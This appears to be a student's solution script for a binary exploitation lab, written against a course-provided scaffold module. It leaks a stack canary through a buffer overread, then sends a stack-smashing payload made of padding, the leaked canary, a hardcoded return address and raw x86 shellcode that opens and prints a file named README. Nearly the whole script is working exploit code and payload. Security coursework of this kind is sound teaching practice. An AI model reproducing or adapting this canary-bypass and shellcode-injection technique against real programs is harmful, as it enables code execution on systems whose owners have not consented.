#!/usr/bin/env python3

import scaffold as p
from scaffold import SHELLCODE
import sys

# Configure Python to print text strings like byte strings. Don't remove this!
sys.stdout.reconfigure(encoding='latin1')

### YOUR CODE STARTS HERE ###

# Program start:
p.start()

# Example send:
p.send('test\\x41\n')

# Example receive:
assert p.recv(6) == 'testA\n'

# PART 1: GET STACK CANARY
p.send('A' * 12 + '\\x\n') # Used to skip past the end of c.buffer and read the stack canary
data = p.recv(21)

# Extract the stack canary value
byte_data = [ord(c) for c in data]
fixed_data = byte_data[13:]
fixed_bytes = ''.join(f'\\x{b:02x}' for b in fixed_data)

# PART 2: EXECUTE SHELLCODE
addr_of_shellcode = '\x60\xdc\xff\xff' # RIP of dehexify + 4 bytes

SHELLCODE = \
    '\x31\xc0\x31\xdb\x31\xc9\x31\xd2' \
    '\xeb\x32\x5b\xb0\x05\x31\xc9\xcd' \
    '\x80\x89\xc6\xeb\x06\xb0\x01\x31' \
    '\xdb\xcd\x80\x89\xf3\xb0\x03\x83' \
    '\xec\x01\x8d\x0c\x24\xb2\x01\xcd' \
    '\x80\x31\xdb\x39\xc3\x74\xe6\xb0' \
    '\x04\xb3\x02\xb2\x01\xcd\x80\x83' \
    '\xc4\x01\xeb\xdf\xe8\xc9\xff\xff' \
    '\xffREADME\x00'

padding = "A" * 32 # For c.buffer and c.answer

payload = padding + fixed_bytes + "A"*8 + addr_of_shellcode + SHELLCODE
print(''.join(f'\\x{ord(c):02x}' for c in payload))
p.send(payload)
### YOUR CODE ENDS HERE ###
